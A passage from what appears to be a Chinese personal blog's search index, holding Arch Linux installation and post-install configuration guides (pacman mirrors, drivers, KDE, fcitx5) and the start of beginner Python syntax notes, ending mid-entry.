 # 查看循环依赖、额外依赖$ pacman -Qm  # 查看不属于远程仓库的软件包，请注意下面要介绍的 AUR 软件包也包括在其中</code></pre><h2 id="3-软件仓库镜像"><a href="#3-软件仓库镜像" class="headerlink" title="3.软件仓库镜像"></a>3.软件仓库镜像</h2><p>软件仓库镜像（镜像源）是软件仓库的复制品，部署在全球各地，以便于用户获取软件包。我们在安装过程中已经选择了合适的镜像源，但是为了保证镜像源的可用性，需要定期重新设置镜像源。</p><h3 id="3-1官方镜像源列表"><a href="#3-1官方镜像源列表" class="headerlink" title="3.1官方镜像源列表"></a>3.1官方镜像源列表</h3><p>欲查看官方镜像源列表，请查看 <a href="https://archlinux.org/mirrors/status/">这里</a>。笔者十分建议您选择“同步成功的镜像源（Successfully Syncing Mirrors）”。</p><h3 id="3-2手动设置镜像源"><a href="#3-2手动设置镜像源" class="headerlink" title="3.2手动设置镜像源"></a>3.2手动设置镜像源</h3><p>编辑 &#x2F;etc&#x2F;pacman.d&#x2F;mirrorlist 以便手动设置镜像源，将您要使用的镜像源放在“Server &#x3D;”后面即可。</p><pre><code class="asciidoc">$ sudo -e /etc/pacman.d/mirrorlist/etc/pacman.d/mirrorlist------------------------Server = https://geo.mirror.pkgbuild.com/$repo/os/$arch</code></pre><p>设置镜像源之后，使用以下命令刷新本地软件包列表。</p><pre><code class="shell"># pacman -Syyu  # 使用两个“y”，强制刷新软件包列表</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> archlinux </tag>
            
            <tag> 包管理器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>archlinux安装后的配置</title>
      <link href="/2024/04/24/linux/archlinux%E5%AE%89%E8%A3%85%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/04/24/linux/archlinux%E5%AE%89%E8%A3%85%E5%90%8E%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、系统配置"><a href="#一、系统配置" class="headerlink" title="一、系统配置"></a>一、系统配置</h1><h2 id="1-创建普通用户"><a href="#1-创建普通用户" class="headerlink" title="1.创建普通用户"></a>1.创建普通用户</h2><p>创建用户tanglx，并加入到wheel组</p><pre><code class="ebnf">useradd -m -G wheel tanglx</code></pre><p>修改密码</p><pre><code class="ebnf">passwd tanglx</code></pre><p>提升权限<br>编辑 &#x2F;etc&#x2F;sudoers，找到#%wheel ALL&#x3D;(ALL:ALL) ALL，取消#号</p><pre><code class="pgsql">%wheel ALL=(ALL:ALL) ALL</code></pre><h2 id="2-设置系统源并更新系统"><a href="#2-设置系统源并更新系统" class="headerlink" title="2.设置系统源并更新系统"></a>2.设置系统源并更新系统</h2><p>安装自动设置源</p><pre><code class="ebnf">sudo pacman -Sy reflector</code></pre><p>设置自动选择源</p><pre><code class="css">reflector -p https -c China --delay 3 --completion-percent 95 --sort rate --save /etc/pacman.d/mirrorlist</code></pre><p>编辑 sudo vim &#x2F;etc&#x2F;pacman.conf ，末尾加入</p><pre><code class="ini">[archlinuxcn]Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch</code></pre><p>更新系统</p><pre><code class="ruby">sudo pacman -Syyupacman-key --initpacman-key --populatesudo pacman -S archlinuxcn-keyring</code></pre><p>如果安装archlinuxcn-keying报错</p><pre><code class="javascript">请使用以下命令在本地信任 farseerfc 的 key 。此 key 已随 archlinux-keyring 安装在系统中，只是缺乏信任：sudo pacman-key --lsign-key &quot;farseerfc@archlinux.org&quot;之后继续安装 archlinuxcn-keyring ：sudo pacman -S archlinuxcn-keyring</code></pre><p>再次更新</p><pre><code class="ebnf">sudo pacman -Syyu</code></pre><h2 id="3-安装aur助手"><a href="#3-安装aur助手" class="headerlink" title="3.安装aur助手"></a>3.安装aur助手</h2><p>base-devel编译时候用到的工具</p><pre><code class="ebnf">pacman -S base-devel yay</code></pre><h2 id="4-显卡驱动安装"><a href="#4-显卡驱动安装" class="headerlink" title="4.显卡驱动安装"></a>4.显卡驱动安装</h2><p>****切记如果要装kde环境直接跳过显卡安装环节，否则会报错<br>我的cpu为i5 4590 显卡NVIDIA gt 730，其它显卡参考下面链接修改<br><a href="https://zhuanlan.zhihu.com/p/568981775">https://zhuanlan.zhihu.com/p/568981775</a><br>安装inter核显驱动</p><pre><code class="ebnf">pacman -S mesa vulkan-intel  </code></pre><p>安装NVIDIA独显卡驱动</p><pre><code class="tcl">sudo pacman -S nvidia-open nvidia-settings lib32-nvidia-utils yay -S nvidia-470xx-dkms</code></pre><p>编辑 &#x2F;etc&#x2F;mkinitcpio.conf，从 HOOKS 数组中去掉 kms</p><pre><code class="ini">HOOKS=(... kms ...)  # 请去掉 kms</code></pre><p>重新生成 initramfs</p><pre><code class="ebnf">mkinitcpio -P</code></pre><p>其次，编辑 &#x2F;etc&#x2F;default&#x2F;grub，在 GRUB_CMDLINE_LINUX_DEFAULT 中添加“nvidia_drm.modeset&#x3D;1”。</p><pre><code class="ini">GRUB_CMDLINE_LINUX_DEFAULT=&quot;... nvidia_drm.modeset=1&quot;</code></pre><p>然后重新生成 grub 配置</p><pre><code class="gradle">grub-mkconfig -o /boot/grub/grub.cfg</code></pre><h2 id="5-其它驱动"><a href="#5-其它驱动" class="headerlink" title="5.其它驱动"></a>5.其它驱动</h2><p>如果是amd执行 pacman -S amd-ucode</p><pre><code class="ebnf">pacman -S intel-ucode</code></pre><h2 id="6-安装桌面环境"><a href="#6-安装桌面环境" class="headerlink" title="6.安装桌面环境"></a>6.安装桌面环境</h2><p>字体安装</p><pre><code class="gauss">pacman -S noto-fonts noto-fonts-cjk noto-fonts-emoji</code></pre><p>桌面安装<br>目前kde使用最新的plasma，plasma-wayland-session不在使用</p><pre><code class="ebnf">pacman -S xorg plasma kde-applications</code></pre><p>设置窗口管理器开机自启动</p><pre><code class="routeros">systemctl enable sddm.service</code></pre><h2 id="7-输入法安装"><a href="#7-输入法安装" class="headerlink" title="7.输入法安装"></a>7.输入法安装</h2><p>&#x2F;&#x2F;安装小企鹅输入法</p><pre><code class="vim">sudo pacman -S fcitx5 fcitx5-qt fcitx5-gtk fcitx5-lua kcm-fcitx5</code></pre><p>安装完成以后配置一下*.xprofile* 文件，终端输入：</p><pre><code class="bash">sudo vim ~/.xprofile</code></pre><p>添加</p><pre><code class="routeros">export INPUT_METHOD=fcitx5export GTK_IM_MODULE=fcitx5export QT_IM_MODULE=fcitx5export XMODIFIERS=@im=fcitx5</code></pre><p>fcitx5中文词库</p><pre><code class="nginx">sudo pacman -S fcitx5-pinyin-zhwiki rime-pinyin-zhwiki fcitx5-pinyin-moegirl-rime</code></pre><p>fcitx5输入语言</p><pre><code class="awk">//中文sudo pacman -S fcitx5-chewing fcitx5-rime fcitx5-chinese-addons //日语sudo pacman -S fcitx5-anthy fcitx5-kkc fcitx5-skk fcitx5-mozc //韩语sudo pacman -S fcitx5-hangul//越南语sudo pacman -S fcitx5-unikey fcitx5-bamboo </code></pre><p>配置 &#x2F;etc&#x2F;environment </p><pre><code class="gradle">sudo vim /etc/environment </code></pre><p>添加</p><pre><code class="routeros">GTK_IM_MODULE=fcitxQT_IM_MODULE=fcitxXMODIFIERS=@im=fcitxSDL_IM_MODULE=fcitxGLFW_IM_MODULE=ibus</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> archlinux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>物理机安装archLinux</title>
      <link href="/2024/04/24/linux/%E7%89%A9%E7%90%86%E6%9C%BA%E5%AE%89%E8%A3%85archLinux/"/>
      <url>/2024/04/24/linux/%E7%89%A9%E7%90%86%E6%9C%BA%E5%AE%89%E8%A3%85archLinux/</url>
      
        <content type="html"><![CDATA[<p>[toc]<br>从官网下载镜像并通过up启动成功联网后</p><h1 id="一、基础配置"><a href="#一、基础配置" class="headerlink" title="一、基础配置"></a>一、基础配置</h1><h2 id="1-设置时间"><a href="#1-设置时间" class="headerlink" title="1.设置时间"></a>1.设置时间</h2><p>查看时间</p><pre><code class="maxima">timedatectl status </code></pre><p>如果时间不对</p><pre><code class="dsconfig">timedatectl set-ntp true  </code></pre><p>如果时区不对</p><pre><code class="dsconfig">timedatectl set-timezone Asia/Shanghai</code></pre><h2 id="2-磁盘分区"><a href="#2-磁盘分区" class="headerlink" title="2.磁盘分区"></a>2.磁盘分区</h2><p>对于 UEFI 需要至少创建三个分区（efi、swap、根）<br><img src="https://picture.tanglx.cn/web/2024/1713970603396.png" alt="enter description here"><br><strong>格式化分区</strong><br>根分区</p><pre><code class="gradle"> mkfs.ext4 /dev/sda3 </code></pre><p>交换分区</p><pre><code class="gradle">mkswap /dev/sda2</code></pre><p>efi分区</p><pre><code class="gradle">mkfs.fat -F 32 /dev/sda1</code></pre><p>lsblk -f 查看是否格式化分区类型成功</p><h2 id="3-挂载分区"><a href="#3-挂载分区" class="headerlink" title="3.挂载分区"></a>3.挂载分区</h2><p> <em>注意：挂载需要遵循一定的顺序，要先挂载根分区。</em><br>根分区</p><pre><code class="bash"> mount /dev/sda3 /mnt</code></pre><p>swap分区</p><pre><code class="gradle"> swapon /dev/sda2</code></pre><p>efi分区</p><pre><code class="gradle"> mount --mkdir /dev/sda1 /mnt/boot</code></pre><h2 id="4-自动设置镜像源"><a href="#4-自动设置镜像源" class="headerlink" title="4.自动设置镜像源"></a>4.自动设置镜像源</h2><pre><code class="css">reflector -p https -c China --delay 3 --completion-percent 95 --sort rate --save /etc/pacman.d/mirrorlist</code></pre><h2 id="5-安装基础包"><a href="#5-安装基础包" class="headerlink" title="5.安装基础包"></a>5.安装基础包</h2><pre><code class="bash">pacstrap -K /mnt base base-devel linux linux-firmware</code></pre><h2 id="6-设置fstab"><a href="#6-设置fstab" class="headerlink" title="6.设置fstab"></a>6.设置fstab</h2><pre><code class="gradle">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</code></pre><h1 id="一、切换到新系统"><a href="#一、切换到新系统" class="headerlink" title="一、切换到新系统"></a>一、切换到新系统</h1><pre><code class="bash">arch-chroot /mnt</code></pre><h2 id="1-设置时区"><a href="#1-设置时区" class="headerlink" title="1.设置时区"></a>1.设置时区</h2><pre><code class="gradle">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimehwclock --systohc</code></pre><h2 id="2-设置locale"><a href="#2-设置locale" class="headerlink" title="2.设置locale"></a>2.设置locale</h2><p>安装编辑器和终端字体</p><pre><code class="vim">pacman -S vim terminus-font</code></pre><p>编辑locale，找到#en_US.UTF-8 UTF-8和#zh_CN.UTF-8 UTF-8取消注释</p><pre><code class="gradle">vim /etc/locale.gen</code></pre><pre><code class="subunit">en_US.UTF-8 UTF-8zh_CN.UTF-8 UTF-8</code></pre><p>生成locale</p><pre><code class="ebnf">locale-gen</code></pre><p>设置locale</p><pre><code class="bash">echo &quot;LANG=en_US.UTF-8&quot; &gt; /etc/locale.conf</code></pre><h2 id="3-网络配置"><a href="#3-网络配置" class="headerlink" title="3.网络配置"></a>3.网络配置</h2><p>设置主机名</p><pre><code class="bash">echo &quot;tanglx-arch&quot; &gt; /etc/hostname</code></pre><p>安装网络管理器</p><pre><code class="ebnf">pacman -S networkmanager</code></pre><p>设置开机自启动网络管理器</p><pre><code class="routeros">systemctl enable NetworkManager.service</code></pre><h2 id="4-设置root密码"><a href="#4-设置root密码" class="headerlink" title="4.设置root密码"></a>4.设置root密码</h2><pre><code class="ebnf">passwd</code></pre><h2 id="5-微码"><a href="#5-微码" class="headerlink" title="5.微码"></a>5.微码</h2><p><em>查看您的 CPU 型号。</em></p><pre><code class="gradle">cat /proc/cpuinfo | grep &quot;model name&quot;</code></pre><p>如果是 Intel CPU，安装 intel-ucode。</p><pre><code class="ebnf"> pacman -S intel-ucode</code></pre><p>如果是 AMD CPU，安装 amd-ucode。</p><pre><code class="ebnf"> pacman -S amd-ucode</code></pre><h2 id="6-安装引导加载程序"><a href="#6-安装引导加载程序" class="headerlink" title="6.安装引导加载程序"></a>6.安装引导加载程序</h2><pre><code class="ebnf">pacman -S grub efibootmgr</code></pre><p>安装grub到计算机</p><pre><code class="routeros">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=GRUB</code></pre><p>如果输出Installation finished. No error reported.表示成功</p><p>最后生成 GRUB 配置，即可</p><pre><code class="gradle">grub-mkconfig -o /boot/grub/grub.cfg</code></pre><h2 id="7-重启"><a href="#7-重启" class="headerlink" title="7.重启"></a>7.重启</h2><p>退出chroot</p><pre><code class="awk">exit</code></pre><p>取消挂载</p><pre><code class="gradle">swapoff /dev/sda2 umount /dev/sda1umount /dev/sda3</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> archlinux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础语法</title>
      <link href="/2024/04/24/%E5%BC%80%E5%8F%91/python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
      <url>/2024/04/24/%E5%BC%80%E5%8F%91/python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><h2 id="一、小功能"><a href="#一、小功能" class="headerlink" title="一、小功能"></a>一、小功能</h2><h3 id="1-1-注释"><a href="#1-1-注释" class="headerlink" title="1.1 注释"></a>1.1 注释</h3><p>注释的作用</p><blockquote><p>解释代码<br>提示代码顺序<br>记录修改代码<br>暂时禁用代码块</p></blockquote><p>1.加入#号注释</p><pre><code>#print(&quot;注释&quot;)</code></pre><p>2.快速注释 选中 ctrl+？</p><pre><code>#print(&quot;注释&quot;)#print(&quot;注释&quot;)</code></pre><p>3.多行注释</p><pre><code>&quot;&quot;&quot;print(&quot;注释&quot;)print(&quot;注释&quot;)print(&quot;注释&quot;)&quot;&quot;&quot;</code></pre><h2 id="二、变量和数据类型"><a href="#二、变量和数据类型" class="headerlink" title="二、变量和数据类型"></a>二、变量和数据类型</h2><h3 id="2-1、变量的赋值"><a href="#2-1、变量的赋值" class="headerlink" title="2.1、变量的赋值"></a>2.1、变量的赋值</h3><p><em>普通字符需要使用双引号<br>数字不需要使用双引号，否则不能计算</em></p><pre><code class="ini">age=22 #数字类型name=&quot;汤lx&quot;#普通类型namne2=&quot;&quot;&quot;汤lx&quot;&quot;&quot;#三引号可以多行写变量</code></pre><h3 id="2-2、标识符"><a href="#2-2、标识符" class="headerlink" title="2.2、标识符"></a>2.2、标识符</h3><p>编写代码时，对变量，类，方法等编写的名字，叫做标识符</p><p>注意事项：</p><ul><li>不能用数字开头</li><li>不能使用内置关键字作为变量</li><li>区分大小写</li><li>只能用中文、数字、下划线、英文命名</li></ul><h3 id="2-3、字符串"><a href="#2-3、字符串" class="headerlink" title="2.3、字符串"></a>2.3、字符串</h3><p><strong>字符串的三种定义法</strong><br>1)单引号定义法：name &#x3D; ‘helloword’<br>1)双引号定义法：name &#x3D; “helloword”<br>1)三引号定义法：name &#x3D; “””helloword”””</p><p><strong>字符串的引号嵌用</strong></p><ul><li>单引号定依法，可以内含双引号</li><li>双引号定依法，可以内含单引号</li><li>可以使用转移字符\来解除效用，变成普通字符串</li></ul><h3 id="2-4、数据类型"><a href="#2-4、数据类型" class="headerlink" title="2.4、数据类型"></a>2.4、数据类型</h3><p>计算机中需要处理各种各样的数据，不同的数据，需要定义不同的数据类型</p><blockquote><p>整型浮点型字符型布尔型空</p></blockquote><ul><li><p>整型(int)<br>例如：0，100，-8080，0</p></li><li><p>浮点型(float)<br>注意：整数和浮点数的存储方式不同，浮点运算时可能会产生一点误差。</p></li><li><p>字符型(str)<br>定义字符型要用单引号或者双引号<br>例如：’abc’ “xyz”</p></li><li><p>布尔型(bool)<br>布尔值用于真假的判断，一个布尔值只有True，False两种值；<br>在Python中，可以直接用True，False表示布尔值（注意大小写）也可以表示式计算。</p></li><li><p>空(None)<br>空值表示什么也没有。<br>Nono不能理解为0，因为0是有意义的，，而None是一个特殊的空值。</p></li></ul><h2 id="三、数据类型的转换和运算符"><a href="#三、数据类型的转换和运算符" class="headerlink" title="三、数据类型的转换和运算符"></a>三、数据类型的转换和运算符</h2><h3 id="3-1、数据类型转换"><a href="#3-1、数据类型转换" class="headerlink" title="3.1、数据类型转换"></a>3.1、数据类型转换</h3><p>  <strong>语法</strong></p><pre><code class="javascript">int(x) #将x转换为整数float(x)#将x转换为浮点数str(x)#将x转换为字符串</code></pre><p>  注意事项</p><ul><li>任何类型都可以转换成字符串</li><li>非数字字符串不能转换为数字</li><li>浮点数转小数会丢失精度</li></ul><h3 id="3-2、运算符"><a href="#3-2、运算符" class="headerlink" title="3.2、运算符"></a>3.2、运算符</h3><p><strong>基础运算符</strong></p><table><thead><tr><th>运算符</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>+</td><td>加</td><td></td></tr><tr><td>-</td><td>减</td><td></td></tr><tr><td>*</td><td>乘</td><td></td></tr><tr><td>&#x2F;</td><td>除</td><td></td></tr><tr><td>&#x2F;&#x2F;</td><td>取整除</td><td>11&#x2F;&#x2F;2&#x3D;5</td></tr><tr><td>%</td><td>取余</td><td>11%2&#x3D;1</td></tr><tr><td>**</td><td>指数</td><td>a**b,b是a的指数</td></tr><tr><td><strong>赋值运算符</strong></td><td></td><td></td></tr><tr><td>运算符</td><td>描述</td><td>备注</td></tr><tr><td>——</td><td>———-</td><td>—————————</td></tr><tr><td>&#x3D;</td><td>赋值运算符</td><td>把&#x3D;号右边的值赋给左边的变量</td></tr></tbody></table><p><strong>复合赋值运算符</strong></p><table><thead><tr><th>运算符</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>+&#x3D;</td><td>加法赋值运算法</td><td>a+&#x3D;b等效于a&#x3D;a+b</td></tr><tr><td>-&#x3D;</td><td>减法赋值运算法</td><td>a-&#x3D;b等效于a&#x3D;a-b</td></tr><tr><td>*&#x3D;</td><td>乘法赋值运算法</td><td>a*&#x3D;b等效于a&#x3D;a*b</td></tr><tr><td>&#x2F;&#x3D;</td><td>除法赋值运算法</td><td>a&#x2F;&#x3D;b等效于a&#x3D;a&#x2F;b</td></tr><tr><td>&#x2F;&#x2F;&#x3D;</td><td>取整除赋值运算法</td><td>a&#x2F;&#x2F;&#x3D;b等效于a&#x3D;a&#x2F;&#x2F;b</td></tr><tr><td>%&#x3D;</td><td>取余赋值运算法</td><td>a%&#x3D;b等效于a&#x3D;a%b</td></tr><tr><td>**&#x3D;</td><td>幂赋值运算法</td><td>a**&#x3D;b等效于a&#x3D;a**b</td></tr></tbody></table><h3 id="3-3、逻辑运算符"><a href="#3-3、逻辑运算符" class="headerlink" title="3.3、逻辑运算符"></a>3.3、逻辑运算符</h3><table><thead><tr><th>运算符</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td>not</td><td>非</td><td>相当于“反义词”</td></tr><tr><td>and</td><td>和</td><td>条件同时为真，才可以是真</td></tr><tr><td>or</td><td>或</td><td>条件有一个为真，结果就为真</td></tr><tr><td>三个逻辑运算符的优先级为：</td><td></td><td></td></tr></tbody></table><pre><code class="python">not &gt; and &gt; or</code></pre><h3 id="3-4、字符串大小的比较"><a href="#3-4、字符串大小的比较" class="headerlink" title="3.4、字符串大小的比较"></a>3.4、字符串大小的比较</h3><p>在程序中，字符串所用的所有字符如：</p><ul><li>大小写英文单词</li><li>数字</li><li>特殊符号(!、\、|、@、#、空格等)</li></ul><p>都有对应的ASCII码值表，每一个字符都能对应上一个：数字的码值</p><ul><li>字符串进行比较大小就是基于数字的码值大小进行比较的</li><li>从头到尾，按位对应比较，只要有一位大，那么整体就大(后面就无需比较了)</li></ul><blockquote><p>例如：<br>abc和abd比较(d比c大，那么abd就大)<br>a和ab比较(a和a一样，b就大，那么ab就大)</p></blockquote><h2 id="四、字符串的处理"><a href="#四、字符串的处理" class="headerlink" title="四、字符串的处理"></a>四、字符串的处理</h2><h3 id="4-1、字符串的拼接"><a href="#4-1、字符串的拼接" class="headerlink" title="4.1、字符串的拼接(+)"></a>4.1、字符串的拼接(+)</h3><p>使用”+”号拼接<br>语法：</p><pre><code class="javascript">&quot;字面量&quot; + 非数字变量</code></pre><p>特点：<br>只能字符串之间进行拼接，非字符串无法拼接</p><h3 id="4-2、字符串的格式化"><a href="#4-2、字符串的格式化" class="headerlink" title="4.2、字符串的格式化(%)"></a>4.2、字符串的格式化(%)</h3><p> 通过%来占位，后面的变量来替换%<br> 语法：</p><pre><code class="gcode">&quot;%s %f&quot; % (变量1,变量n)</code></pre><p> 常用的占位符有三个：</p><ul><li>字符串： %s </li><li>整型：%d </li><li>浮点型：%f</li></ul><p>特点：</p><ul><li>多个变量需要使用（）括起来,并按照占位的顺序填入变量</li><li>可以对精度控制</li><li>对数据类型进行区分<br>例子：</li></ul><pre><code class="ini"> name = &quot;tanglx&quot; qq = 54312795 Height = 1.75 message = &quot;我叫%s&quot;%name Message = &quot;我叫%s,升高%是,qq是%s&quot;%(name,Height,qq) Message_2 = &quot;我叫%s,升高%f是,qq是%d&quot;%(name,Height,qq)</code></pre><h3 id="4-3、字符串格式化的精度控制"><a href="#4-3、字符串格式化的精度控制" class="headerlink" title="4.3、字符串格式化的精度控制(%)"></a>4.3、字符串格式化的精度控制(%)</h3><p>精度控制的语法：</p><pre><code class="gcode">&quot;m.n%s .n%f&quot; % (变量1,变量n)</code></pre><p>特点：</p><ul><li>m.n的形式控制，m是宽度，n是小数精度</li><li>m和.n均可以忽略，根据需要可以单独写</li><li>m比字符本身宽度还小的时候，m不生效</li><li>.n会对小数部分做精度限制同时会对小数进行四舍五入</li></ul><p>例子：</p><pre><code class="javascript">name = &quot;tanglx&quot;int = 21height = 1.75print(&quot;宽度为不限制：%s&quot;%name)print(&quot;宽度限制为7：%7s&quot;%name)print(&quot;不设置精度：%f&quot;%height)print(&quot;设置精度为2：%.2f&quot;%height)print(&quot;设置宽度为7,精度为1:%7.1f&quot;%height)</code></pre><h3 id="4-4、-字符串的格式化-format"><a href="#4-4、-字符串的格式化-format" class="headerlink" title="4.4、 字符串的格式化(format)"></a>4.4、 字符串的格式化(format)</h3><p>对精度没有要求的时候可以快速使用<br>语法：</p><pre><code class="python">f&quot;&#123;变量1&#125;&#123;变量n&#125;&quot;</code></pre><p>特点：</p><ul><li>不理会类型</li><li>不做精度控制<br>例子：</li></ul><pre><code class="javascript">name = &quot;tanglx&quot;age = 21height = 1.75print(f&quot;我叫&#123;name&#125;,今年&#123;age&#125;,身高&#123;height&#125;&quot;)</code></pre><h3 id="4-5、对表达式进行格式化"><a href="#4-5、对表达式进行格式化" class="headerlink" title="4.5、对表达式进行格式化"></a>4.5、对表达式进行格式化</h3><p>表达式：<br>表达式就是一个明确是结果的例句</p><p>语法： </p><pre><code class="javascript">f&quot;&#123;表达式&#125;&quot;&quot;%s&quot;%(表达式)</code></pre><p>例子:</p><pre><code class="python">print(&quot;1*1的结果是：%s&quot;%1*1)print(f&quot;1*1的结果是:&#123;1*1&#125;&quot;)print(&quot;字符串在python中的格式类型是:%s&quot;% type(&#39;字符串&#39;))</code></pre><h3 id="4-6、字符串的转义"><a href="#4-6、字符串的转义" class="headerlink" title="4.6、字符串的转义"></a>4.6、字符串的转义</h3><p>也叫转义符，比如\n表示换行、\t表示制表符(tab)</p><h4 id="4-6-1、取消转义"><a href="#4-6-1、取消转义" class="headerlink" title="4.6.1、取消转义"></a>4.6.1、取消转义</h4><p>通常如果要把一个链接或者文件路径写为字符串时特殊字符会被识别为转义符，这时候就需要用到取消转义</p><p><strong>全部取消：</strong><br>语法：<br><code>r &quot; &quot;</code><br>实例：</p><pre><code class="python">file = r&quot;C:\Users\tanglx\Documents\me\study\python\execise\八、函数&quot;print(f&quot;取消全部转义：&#123;file&#125;&quot;)</code></pre><p><strong>针对性取消:</strong><br>语法：<br><code>\</code><br>示例：</p><pre><code class="python">file = &quot;C:\\Users\\tanglx\\Documents\\me\\study\\python\\execise\\八、函数&quot;print(f&quot;针对性取消转义：&#123;file&#125;&quot;)</code></pre><h2 id="五、数据输入"><a href="#五、数据输入" class="headerlink" title="五、数据输入"></a>五、数据输入</h2><p>语句：</p><pre><code class="javascript">变量 = input(&quot;提示内容&quot;)</code></pre><p>特点：</p><ul><li>输入数据类型默认为字符串，需要其它类型需要自行转换</li></ul><p>例子：</p><pre><code class="javascript">input的几种写法：name = input()#直接把输入输入数据给变量name = input(&quot;输入：&quot;) # 先打印内容&quot;输入：&quot;，再进行age = int(input())  #输入后转换为int型</code></pre><h2 id="六、-判断语句"><a href="#六、-判断语句" class="headerlink" title="六、 判断语句"></a>六、 判断语句</h2><h3 id="6-1、布尔类型和比较运算符"><a href="#6-1、布尔类型和比较运算符" class="headerlink" title="6.1、布尔类型和比较运算符"></a>6.1、布尔类型和比较运算符</h3><p>布尔类型</p><ul><li>True 真 (1)</li><li>False 假 (0)</li></ul><p>比较运算符</p><ul><li>&#x3D;&#x3D; !&#x3D; &gt; &lt; &gt;&#x3D; &lt;&#x3D;</li></ul><pre><code class="javascript">通过比较运算符可以得到布尔结果</code></pre><h3 id="6-2、if语句的基本格式"><a href="#6-2、if语句的基本格式" class="headerlink" title="6.2、if语句的基本格式"></a>6.2、if语句的基本格式</h3><p>语句：</p><pre><code class="javascript">if 条件:    成立则执行的语句1    成立则执行的语句n</code></pre><p>注意事项：</p><ul><li>条件可以用表达式的写法</li><li>if语句判断的结果必须是布尔类型True或Flase</li><li>Ture会继续执行，Flase则跳过</li><li>归属于if代码块的语句前面必须有四个空格</li></ul><h3 id="6-3、if-else-语句"><a href="#6-3、if-else-语句" class="headerlink" title="6.3、if else 语句"></a>6.3、if else 语句</h3><p>语句：</p><pre><code class="javascript">if 条件:    成立则执行的语句1    成立则执行的语句nelse :    不成立则执行的语句1    不成立则执行的语句n</code></pre><p>注意事项：</p><ul><li>和if代码块一样，需要在执行代码块前面加入四个空格</li><li>else后，不需要成立</li></ul><h3 id="6-4、if-elif-else-语句"><a href="#6-4、if-elif-else-语句" class="headerlink" title="6.4、if elif else 语句"></a>6.4、if elif else 语句</h3><p>语句：</p><pre><code class="python">if 条件1:    条件1成立则执行的语句1    条件1成立则执行的语句nelif 条件2:    条件1不成立则执行的语句1    条件1不成立则执行的语句nelif 条件3:    条件2不成立则执行的语句1    条件2不成立则执行的语句nelse :    都不成立则执行的语句1    都不成立则执行的语句n</code></pre><p>注意事项：</p><ul><li>条件可以用表达式的写法</li><li>elif可以写多个</li><li>条件是互斥且是有顺序的</li><li>条件成立后则不会执行后面的条件以及else</li></ul><h3 id="6-5、判断语句的嵌套"><a href="#6-5、判断语句的嵌套" class="headerlink" title="6.5、判断语句的嵌套"></a>6.5、判断语句的嵌套</h3><p>语句：</p><pre><code class="python">if 条件:    if 条件：    else 条件：elif 条件:    if 条件：    else 条件：else :    if 条件：    else 条件：</code></pre><p>注意事项：</p><ul><li><ul><li>判断语句用于多条件，多层次的逻辑判断</li></ul></li><li>嵌套判断可以更具需求，自由组合 if elif else来构成多层次判断</li><li>判断语句一定要注意空格缩进，python通过空格缩进确定层次关系</li></ul><h2 id="七、循环"><a href="#七、循环" class="headerlink" title="七、循环"></a>七、循环</h2><h3 id="7-1、-while循环基础"><a href="#7-1、-while循环基础" class="headerlink" title="7.1、 while循环基础"></a>7.1、 while循环基础</h3><p>语句：</p><pre><code class="python">i = 0while i&lt;100:    执行语句    i+=1</code></pre><p>注意事项：</p><ul><li>while的条件需得到布尔类型，True表示继续循环，False表示结束循环</li><li>需要设置循环终止条件，如i+&#x3D;1 配合 i&lt;100 就能确保100此之后停止，否则将无限循环</li><li>空格缩进和if判断一样，都需要设置</li></ul><h3 id="7-2-、while循环嵌套"><a href="#7-2-、while循环嵌套" class="headerlink" title="7.2 、while循环嵌套"></a>7.2 、while循环嵌套</h3><p>语法：</p><pre><code class="python">while 条件1:    满足条件1时，要做的事情1    满足条件1时，要做的事情2    满足条件1时，要做的事情3    while 条件2：        满足条件2时，要做的事情1        满足条件2时，要做的事情2        满足条件2时，要做的事情3</code></pre><p>注意事项：</p><ul><li>通过空格缩进来确定嵌套关系</li><li>注意条件的控制，避免无限循环</li></ul><h3 id="7-3、-for循环基础"><a href="#7-3、-for循环基础" class="headerlink" title="7.3、 for循环基础"></a>7.3、 for循环基础</h3><h4 id="7-3-1、for循环基础语法"><a href="#7-3-1、for循环基础语法" class="headerlink" title="7.3.1、for循环基础语法"></a>7.3.1、for循环基础语法</h4><p>for循环和while区别：</p><ul><li>while 循环的循环条件是自定义的，自行控制循环条件</li><li>for循环是一种”轮询“机制，是对一批内容进行”逐个处理“</li></ul><p>语法：</p><pre><code class="python">for 零时变量 in 被处理的数据集(序列):    满足条件执行的代码</code></pre><p>注意事项：</p><ul><li>for循环本质上是遍历</li><li>同while循环不同，for循环无法定义循环条件。</li><li>只能从被处理的数据集中，依次取出内容内容进行处理</li><li>python的for循环无法构建无线循环(被处理的数据不可能无限大)</li></ul><h4 id="7-3-2、range语句"><a href="#7-3-2、range语句" class="headerlink" title="7.3.2、range语句"></a>7.3.2、range语句</h4><p>range语句的功能是：</p><ul><li>获得一个数字序列</li></ul><p>语法：<br>语法1：</p><pre><code class="maxima">range(num)# 从0开始，到num结束(不含num本身)</code></pre><p>语法2：</p><pre><code class="stylus">range(num1,num2)# 从num1开始，到num2结束(不含num2本身)</code></pre><p>语法3：</p><pre><code class="maxima">range(num1,num2,step)# 从num1开始，到num2结束,step为步长</code></pre><h4 id="7-3-3、for循环的零时变量"><a href="#7-3-3、for循环的零时变量" class="headerlink" 